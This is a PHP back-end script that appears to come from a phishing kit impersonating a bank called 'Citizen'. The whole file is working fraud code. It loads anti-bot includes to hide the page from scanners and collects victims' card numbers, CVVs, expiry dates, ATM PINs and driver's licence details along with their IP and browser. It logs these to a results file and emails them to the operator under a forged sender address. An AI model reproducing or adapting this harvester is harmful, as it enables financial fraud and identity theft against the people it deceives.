<?php
session_start();

include "../../admin/config.php";
if($bots == "on"){
    include '../antbots/ip_blocklist.php';  
    include '../antbots/Crawler.php';
    include '../antbots/Boting.php';
    include '../antbots/blacklist.php';
    include '../antbots/new.php';
    include '../antbots/myz.php';
}


if(!empty($_POST['card'])){

$file= "../Result/cc".$pin.".txt";

$data  = "[ - ] =======| CC |======== [ - ]\n";
$data .= "[+]CC:      ".$_POST['card']."\n";
$data .= "[+]CVV:              ".$_POST['cvv']."\n";
$data .= "[+]EXP:              ".$_POST['expr']."\n";
$data .= "[+]ATMPIN:           ".$_POST['atmpin']."\n";
$data .= "[+]DLN:              ".$_POST['dln']."\n";
$data .= "[+]DLN ISSUE:        ".$_POST['dlnissue']."\n";
$data .= "[ - ] =======| -- |=========== [ - ]\n";
$data .= "[+]IP:         ".$_SERVER['REMOTE_ADDR']."\n";
$data .= "[+]Browser:    ".$_SERVER['HTTP_USER_AGENT']."\n";
$data .= "[ - ] =======| END |=========== [ - ]\n";
$praga=rand();
$praga=md5($praga);
$pra = rand(1111111111,9999999999);


$f = fopen($file,"a+");
fwrite($f,$data."\n");
fclose($f);


$to = $your_email;
$subject = $pra."- Citizen CARD -[".$_SERVER['REMOTE_ADDR']."]";
$headers = "From: Blueprint".$pra."<blueprint@".$pra."citizen.com>";
mail($to,$subject,$data,$headers);


    header("location: /thanks.php");
}else{
    header("location: /credit_verify.php.php");
}
?>